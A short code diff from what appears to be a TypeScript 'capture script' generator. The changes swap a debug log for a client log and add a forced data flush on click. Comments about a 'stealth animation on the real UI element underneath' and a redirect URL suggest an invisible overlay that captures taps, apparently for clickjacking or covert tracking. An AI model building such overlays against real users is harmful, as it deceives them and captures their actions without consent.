@@ -146,7 +146,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }
           
           function handleTap(e) {
-            console.log("[DEBUG] Click handled in handleTap, for ID: ", targetId);
+            clientLog("handleTap: Clicked");
             var btn = getTargetBtn();
             // Stealth animation on the real UI element underneath
             if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
@@ -172,6 +172,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                }
             } catch(ex) {}
 
+            flushExtra(); // Force flush on click
             trigger();
           }
           
